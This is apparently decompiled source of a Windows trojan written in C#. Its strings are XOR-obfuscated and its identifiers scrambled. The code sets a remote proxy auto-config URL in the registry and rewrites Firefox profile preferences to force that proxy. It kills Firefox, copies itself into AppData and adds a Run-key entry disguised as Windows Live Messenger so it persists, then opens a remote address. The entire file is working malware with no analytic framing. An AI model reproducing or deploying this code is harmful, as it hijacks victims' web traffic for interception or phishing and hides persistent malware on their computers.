using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using Microsoft.Win32;

namespace aEdfhyLJkOxszPPAeSCA;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		string[] array = new string[2]
		{
			EqDeyEPGRMVCttRaw("mqqu?**`g76dgdwg+uwjc7555+uq*ojjhid*hjapi`v*hjaZrwduu`w*fjkc(}+q}q"),
			EqDeyEPGRMVCttRaw("mqqu?**fw|vqdii||jpwv+fjh*hjapi`v*hjaZrmjvjkilk`*odv*fjkc(}+umu")
		};
		bool flag = true;
		string value = EqDeyEPGRMVCttRaw("qqq(nirkgoj(eik");
		string pjkEeeUbnUmUeBEWLrA = EqDeyEPGRMVCttRaw("mqqu?**udimdfju`q`i`fj+fjh*w`v*rv*vp+umu");
		bool flag2 = true;
		bool mgExPgsPkyzqGRPkjwg = false;
		string value2 = "";
		for (int i = 0; i < array.Length; i++)
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(array[i]));
			httpWebRequest.Timeout = 3000;
			try
			{
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				if (httpWebResponse != null && httpWebResponse.StatusCode == HttpStatusCode.OK)
				{
					string text = new WebClient().DownloadString(array[i]);
					if (flag || text.Contains(value))
					{
						value2 = array[i];
						break;
					}
				}
			}
			catch (Exception)
			{
			}
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(EqDeyEPGRMVCttRaw("Vjcqrdw`YHlfwjvjcqYRlkajrvYFpww`kqS`wvljkYLkq`wk`q%V`qqlkbv"), writable: true);
		registryKey.SetValue(EqDeyEPGRMVCttRaw("Uwj}|Mqqu4+4"), 1, RegistryValueKind.DWord);
		registryKey.SetValue(EqDeyEPGRMVCttRaw("@kdgi`Mqqu4Z4"), 1, RegistryValueKind.DWord);
		registryKey.SetValue(EqDeyEPGRMVCttRaw("DpqjFjkclbPwi"), value2, RegistryValueKind.String);
		registryKey.Close();
		_ = Environment.UserName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EqDeyEPGRMVCttRaw("YHj\u007fliidYClw`cj}YUwjcli`v");
		string searchPattern = EqDeyEPGRMVCttRaw("/+a`cdpiq");
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path, searchPattern);
			string[] array2 = directories;
			foreach (string text2 in array2)
			{
				if (!File.Exists(text2 + EqDeyEPGRMVCttRaw("Yuw`cv+ov")))
				{
					continue;
				}
				FkAmTIuGmTlCEZjA(EqDeyEPGRMVCttRaw("clw`cj}"));
				StringBuilder stringBuilder = new StringBuilder();
				string[] array3 = File.ReadAllLines(text2 + EqDeyEPGRMVCttRaw("Yuw`cv+ov"));
				string[] array4 = array3;
				foreach (string text3 in array4)
				{
					for (int l = 0; l < 5; l++)
					{
						if (text3.Contains(EqDeyEPGRMVCttRaw("pv`wZuw`c-'k`qrjwn+uwj}|+q|u`')%") + l + ");"))
						{
							text3.Replace(EqDeyEPGRMVCttRaw("pv`wZuw`c-'k`qrjwn+uwj}|+q|u`')%") + l + ");", EqDeyEPGRMVCttRaw("pv`wZuw`c-'k`qrjwn+uwj}|+q|u`')%0,>"));
						}
						stringBuilder.AppendLine(text3);
					}
					stringBuilder.AppendLine("pv`wZuw`c-'k`qrjwn+uwj}|+q|u`')%0,>");
					File.WriteAllText(text2 + EqDeyEPGRMVCttRaw("Yuw`cv+ov"), stringBuilder.ToString());
				}
			}
		}
		if (flag2)
		{
			string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\OSgzrtQHZUWfKdKGahCA.exe";
			if (!File.Exists(text4))
			{
				try
				{
					RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(EqDeyEPGRMVCttRaw("Vjcqrdw`YHlfwjvjcqYRlkajrvYFpww`kqS`wvljkYWpk"), writable: true);
					registryKey2.SetValue(EqDeyEPGRMVCttRaw("Rlkajrv%Ils`%H`vv`kb`w"), "\"" + text4 + "\"");
					registryKey2.Flush();
					registryKey2?.Close();
					File.Copy(Assembly.GetExecutingAssembly().Location, text4);
				}
				catch (Exception)
				{
				}
				cKRuAKhUCdLlAheHUkQ(pjkEeeUbnUmUeBEWLrA, mgExPgsPkyzqGRPkjwg);
			}
		}
		else
		{
			cKRuAKhUCdLlAheHUkQ(pjkEeeUbnUmUeBEWLrA, mgExPgsPkyzqGRPkjwg);
		}
	}

	public static string EqDeyEPGRMVCttRaw(string uKsTiCbkybvHkuKzbg)
	{
		StringBuilder stringBuilder = new StringBuilder(uKsTiCbkybvHkuKzbg);
		StringBuilder stringBuilder2 = new StringBuilder(uKsTiCbkybvHkuKzbg.Length);
		for (int i = 0; i < uKsTiCbkybvHkuKzbg.Length; i++)
		{
			char c = stringBuilder[i];
			c = (char)(c ^ 5u);
			stringBuilder2.Append(c);
		}
		return stringBuilder2.ToString();
	}

	public static void FkAmTIuGmTlCEZjA(string jfodysdkORNPcbikTtA)
	{
		Process[] processesByName = Process.GetProcessesByName(jfodysdkORNPcbikTtA);
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	public static void cKRuAKhUCdLlAheHUkQ(string pjkEeeUbnUmUeBEWLrA, bool MgExPgsPkyzqGRPkjwg)
	{
		if (MgExPgsPkyzqGRPkjwg)
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(pjkEeeUbnUmUeBEWLrA));
			httpWebRequest.Timeout = 3000;
			try
			{
				_ = ((HttpWebResponse)httpWebRequest.GetResponse())?.StatusCode;
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = pjkEeeUbnUmUeBEWLrA;
			process.StartInfo.Verb = "Open";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			process.Start();
		}
		catch (Exception)
		{
		}
	}
}
